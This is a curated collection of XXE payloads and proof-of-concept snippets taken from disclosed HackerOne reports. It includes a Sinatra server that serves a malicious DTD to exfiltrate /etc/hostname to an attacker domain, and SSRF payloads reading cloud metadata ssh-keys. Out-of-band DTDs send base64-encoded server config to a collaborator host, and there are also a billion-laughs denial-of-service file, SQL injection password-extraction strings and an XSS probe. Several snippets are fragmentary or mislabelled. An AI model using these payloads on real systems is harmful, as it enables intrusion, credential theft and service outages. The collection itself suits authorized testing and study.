# XML External Entities (XXE)  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1156748](https://hackerone.com/reports/1156748)  -  XXE in Enterprise Search's App Search web crawler
*critical*

```ruby
require 'sinatra'

set :bind, '0.0.0.0'

get '/robots.txt' do

  'User-agent: *
Disallow:

sitemap: /sitemap.xml
'
end

get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY % dtd SYSTEM "http://YOURDOMAIN.COM/exfil.dtd">
%dtd;
%param1;
%exfil;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
<url>
    <loc>&test;</loc>
    <lastmod>2019-06-19</lastmod>
    <changefreq>daily</changefreq>
</url>
</urlset>'
end

get '/exfil.dtd' do
  content_type 'application/xml-dtd'

  '<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://YOURDOMAIN.COM/exfil?%data;\'>">'
# … truncated …
```

## 2. [#742808](https://hackerone.com/reports/742808)  -  Non-production Open Database In Combination With XXE Leads To SSRF
*critical*

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## 3. [#742808](https://hackerone.com/reports/742808)  -  Non-production Open Database In Combination With XXE Leads To SSRF
*critical*

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## 4. [#1156748](https://hackerone.com/reports/1156748)  -  XXE in Enterprise Search's App Search web crawler
*critical*

```http
get '/sitemap.xml' do
```

## 5. [#500515](https://hackerone.com/reports/500515)  -  XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx
*critical*

```http
post the edited request,the starbucks's server will visit the attacker's server to get the DTD file.

## Impact
```

## 6. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "The espurr purrs"> %ext;
]>
<r></r>
```

## 7. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://dct3rq1rn24apf28qeowjcmwpnvmjb.burpcollaborator.net/?">
    %xxe;
]>
<list></list>
```

## 8. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://h1-sd2gah.s3.eu-west-2.amazonaws.com/evil.dtd"> %xxe;]>
<list></list>
```

## 9. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```http
GET /?x=IyMKIyBZb3(long base64 string) HTTP/1.0
Host: 4din7yig3rkad847vsi5517v7mdc11.burpcollaborator.net
```

## 10. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```
select * from host where id = -1 UNION SELECT 4,'my_ip',32 from user where id=1 limit 1 -- LIMIT 1`
```

## 11. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```
-1 UNION SELECT 4,'my_ip',ascii(substring(password,1,1)) from user where id=1 --
```

## 12. [#1156748](https://hackerone.com/reports/1156748)  -  XXE in Enterprise Search's App Search web crawler
*critical*

```http
get '/robots.txt' do

'User-agent: *
```

## 13. [#1156748](https://hackerone.com/reports/1156748)  -  XXE in Enterprise Search's App Search web crawler
*critical*

```http
get '/exfil.dtd' do
```

## 14. [#486732](https://hackerone.com/reports/486732)  -  Partial bypass of #483774 with Blind XXE on https://duckduckgo.com
*high*

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```

## 15. [#509315](https://hackerone.com/reports/509315)  -  c3p0 may be exploited by a Billion Laughs Attack when loading XML configuration
*medium*

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ELEMENT lolz (#PCDATA)>
        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
<lolz>&lol9;</lolz>
```

## 16. [#1095645](https://hackerone.com/reports/1095645)  -  Authenticated XXE
*medium*

```
if (PHP_VERSION_ID < 80000) {
				// http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html
				// https://core.trac.wordpress.org/changeset/29378
				// This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
				// disabled by default, so this function is no longer needed to protect against XXE attacks.
				$loader = libxml_disable_entity_loader(true);
			}
			$XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);
```

## 17. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://4din7yig3rkad847vsi5517v7mdc11.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

## 18. [#845832](https://hackerone.com/reports/845832)  -  SVG file upload leads to XML injection
*low*

```html
<script>alert(1)</script>
```

## 19. [#742808](https://hackerone.com/reports/742808)  -  Non-production Open Database In Combination With XXE Leads To SSRF
*critical*

```
13:22:26.077 [main] ERROR org.apache.hive.jdbc.HiveConnection - Error opening session
org.apache.hive.org.apache.thrift.TApplicationException: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=default})
```

## 20. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://█████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://██████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
```

## 21. [#509315](https://hackerone.com/reports/509315)  -  c3p0 may be exploited by a Billion Laughs Attack when loading XML configuration
*medium*

```
String FEATURE = null;
FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
fact.setFeature(FEATURE, true);
```

## 22. [#509315](https://hackerone.com/reports/509315)  -  c3p0 may be exploited by a Billion Laughs Attack when loading XML configuration
*medium*

```python
import com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils;
import java.io.InputStream;

public class C3P0PoC {

    public static void main(String[] args) throws Exception {

        String payload = args[0];
        InputStream inputStream = C3P0PoC.class.getResourceAsStream(payload);

        C3P0ConfigXmlUtils.extractXmlConfigFromInputStream(inputStream, false);


        System.out.println("Completed!");
    }
}
```
